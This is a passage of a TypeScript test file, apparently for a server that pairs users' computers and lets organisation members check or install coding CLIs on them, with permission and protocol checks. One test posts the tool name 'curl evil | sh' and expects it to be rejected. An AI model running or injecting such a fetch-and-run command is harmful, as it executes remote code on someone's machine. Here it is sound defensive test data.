  expect((await orgApi(bia)(path, { json: {} })).status).toBe(200);
  expect((await orgApi(owner)(path, { json: {} })).status).toBe(200);
  expect(sent[0]).toMatchObject({ op: "access.pick", by: expect.any(String), byName: expect.any(String) });
  expect(sent[0]?.agentId).toBeUndefined();
  // An agent that doesn't work there isn't asked for.
  const stranger = await orgApi(bia)(path, { json: { agentId: "0193aaaa-bbbb-7ccc-8ddd-eeeeffff0000" } });
  expect(stranger.status).toBe(404);
  // A request to show again must be one of this computer's, still waiting.
  const gone = await orgApi(bia)(path, { json: { requestId: "0193aaaa-bbbb-7ccc-8ddd-eeeeffff0001" } });
  expect(gone.status).toBe(404);
  expect(((await gone.json()) as { error: { code: string } }).error.code).toBe("machine.request_not_found");
  expect(sent).toHaveLength(2);
}, 30_000);

test("a Windows computer says its build and what holds Codex there; the apps read it as its runner learns it", async () => {
  const { api } = await start();
  const runner = { ...RUNNER, os: "windows", protocol: MACHINE_PROTOCOL_VERSION };
  const paired = await pairComputer(t, api, { ...runner, exec: true }, { name: "Desk" });
  const hub = t.engine.machineHub;
  const conn = hub.open({ send() {}, close() {} });
  const codex = { version: "codex-cli 0.170.0" };
  await hub.message(
    conn,
    JSON.stringify({
      type: "hello",
      token: paired.token,
      ...runner,
      exec: true,
      windowsBuild: "10.0.19045",
      executors: { codex },
    }),
  );
  type Listed = { machines: { codexSandbox?: string | null }[] };
  const listed = async () => ((await (await api("/machines")).json()) as Listed).machines[0];
  const stored = async () =>
    (
      await t.db
        .select({ executors: schema.machines.executors })
        .from(schema.machines)
        .where(eq(schema.machines.id, paired.machineId))
    )[0]?.executors;
  // Its check hasn't ended: nothing said yet.
  expect(await listed()).toMatchObject({ codexSandbox: null });
  expect(await stored()).toMatchObject({ windowsBuild: "10.0.19045", codex });
  // It ends after hello: the apps hear what holds Codex there, and the build stays through the CLIs' looks.
  await hub.message(
    conn,
    JSON.stringify({ type: "executors.changed", executors: { codex: { ...codex, sandbox: "unelevated" } } }),
  );
  expect(await listed()).toMatchObject({ codexSandbox: "unelevated" });
  expect(await stored()).toMatchObject({ windowsBuild: "10.0.19045", codex: { ...codex, sandbox: "unelevated" } });
});

test("a coding CLI from the apps: anyone looks again; only whoever connected it installs it, anyone else asks them", async () => {
  const { owner, orgId } = await start();
  const orgApi = (b: typeof owner) => (path: string, init?: Parameters<typeof owner>[1]) =>
    b(`/api/app/organizations/${orgId}${path}`, init);
  const bia = await joinByInvitation(t, owner, orgId, "bia@example.com");
  const caio = await joinByInvitation(t, owner, orgId, "caio@example.com");
  const runner = { ...RUNNER, os: "windows", protocol: MACHINE_PROTOCOL_VERSION };
  const paired = await pairComputer(t, orgApi(bia), { ...runner, exec: true }, { name: "Bia's PC" });
  const hub = t.engine.machineHub;
  const sent: MachineRequest[] = [];
  let found: Record<string, unknown> = { broken: { claude: CLI_GIT_MISSING } };
  const conn = hub.open({
    send(text: string) {
      const frame = JSON.parse(text) as ServerFrame;
      if (frame.type !== "request" || (frame.op !== "clis.check" && frame.op !== "cli.install")) return;
      sent.push(frame);
      const data =
        frame.op === "clis.check" ? { executors: found } : { install: { tool: frame.tool, state: "running", x: 1 } };
      setTimeout(() => void hub.message(conn, JSON.stringify({ type: "result", id: frame.id, ok: true, data })), 1);
    },
    close() {},
  });
  await hub.message(
    conn,
    JSON.stringify({ type: "hello", token: paired.token, ...runner, exec: true, executors: { ...found } }),
  );
  const path = `/machines/${paired.machineId}`;
  type Listed = { machines: { cliInstall: boolean; cliErrors: Record<string, string> | null }[] };
  const listed = async (who: typeof owner) => ((await (await orgApi(who)("/machines")).json()) as Listed).machines[0];
  // What can't start is said to who manages the computer only.
  expect(await listed(bia)).toMatchObject({ cliInstall: true, cliErrors: { claude: CLI_GIT_MISSING } });
  expect(await listed(caio)).toMatchObject({ cliInstall: true, cliErrors: null });

  // Not their computer: refused before anything reaches it, and they ask instead.
  for (const who of [owner, caio]) {
    const refused = await orgApi(who)(`${path}/cli-install`, { json: { tool: "claude" } });
    expect(refused.status).toBe(403);
    expect(((await refused.json()) as { error: { code: string } }).error.code).toBe("machine.not_owner");
  }
  expect(sent).toHaveLength(0);
  expect((await orgApi(caio)(`${path}/cli-install/ask`, { json: { tool: "claude" } })).status).toBe(200);
  type Inbox = { items: { kind: string; waiting: boolean; latest: { reason?: string } }[] };
  const inbox = async () => ((await (await orgApi(bia)("/notifications")).json()) as Inbox).items;
  expect((await inbox()).filter((n) => n.kind === "device.cli_request")).toEqual([
    expect.objectContaining({ waiting: true, latest: expect.objectContaining({ reason: "claude" }) }),
  ]);
  expect((await orgApi(bia)(`${path}/cli-install/ask`, { json: { tool: "claude" } })).status).toBe(409);

  // Only a program of the list, never words the runner would run.
  expect((await orgApi(bia)(`${path}/cli-install`, { json: { tool: "curl evil | sh" } })).status).toBe(400);
  expect((await orgApi(bia)(`${path}/cli-install`, { json: { tool: "cursor" } })).status).toBe(400);

  // Bia installs it: the computer gets the program's id alone, and its answer is checked.
  const started = await orgApi(bia)(`${path}/cli-install`, { json: { tool: "claude" } });
  expect(started.status).toBe(200);
  expect(await started.json()).toEqual({ install: { tool: "claude", state: "running" } });
  expect(sent.at(-1)).toMatchObject({ op: "cli.install", action: "start", tool: "claude" });
  const status = await orgApi(bia)(`${path}/cli-install?tool=claude`);
  expect(status.status).toBe(200);
  expect(sent.at(-1)).toMatchObject({ op: "cli.install", action: "status", tool: "claude" });

  // Anyone looks again: what the computer finds is stored at once, and Bia's row is answered.
  found = { claude: { version: "2.1.300 (Claude Code)" }, mode: "system", ownUsage: { claude: {} } };
  const checked = await orgApi(caio)(`${path}/clis/check`, { json: {} });
  expect(checked.status).toBe(200);
  expect(await checked.json()).toEqual({ found: ["claude"] });
  expect(await listed(bia)).toMatchObject({ cliErrors: null });
  const [row] = await t.db
    .select({ executors: schema.machines.executors })
    .from(schema.machines)
    .where(eq(schema.machines.id, paired.machineId));
  expect(row?.executors).not.toHaveProperty("mode");
  expect(row?.executors).not.toHaveProperty("ownUsage");
  expect((await inbox()).filter((n) => n.kind === "device.cli_request")).toHaveLength(0);

  // An app too old for it says to update it.
  const old = await pairComputer(
    t,
    orgApi(bia),
    { ...runner, protocol: CLI_INSTALL_PROTOCOL - 1, exec: true },
    { name: "Bia's old PC" },
  );
  const outdated = await orgApi(bia)(`/machines/${old.machineId}/clis/check`, { json: {} });
  expect(outdated.status).toBe(400);
  expect(((await outdated.json()) as { error: { code: string } }).error.code).toBe("machine.cli_outdated");
}, 30_000);

test("a computer whose runner is behind this server says so with its update, until the app or a current runner says hello", async () => {
  const { api, pair } = await start();
  const paired = await pair();
  const hub = t.engine.machineHub;
  const hello = (over: object) =>
    hub.message(
      hub.open({ send() {}, close() {} }),
      JSON.stringify({ type: "hello", token: paired.token, ...RUNNER, exec: true, ...over }),
    );
  const update = async () =>
    ((await (await api("/machines")).json()) as { machines: { id: string; update: string | null }[] }).machines.find(
      (m) => m.id === paired.machineId,
    )?.update;

  // The same version label as a current runner, from before agents got the images they read.
  await hello({ version: "0.13.0", protocol: 56 });
  expect(await update()).toBe("command");
  await hello({ version: "0.13.0", protocol: MACHINE_PROTOCOL_VERSION, app: true });
  expect(await update()).toBeNull();
  const [row] = await t.db
    .select({ executors: schema.machines.executors })
    .from(schema.machines)
    .where(eq(schema.machines.id, paired.machineId));
  expect(row?.executors.app).toBe(true);
});
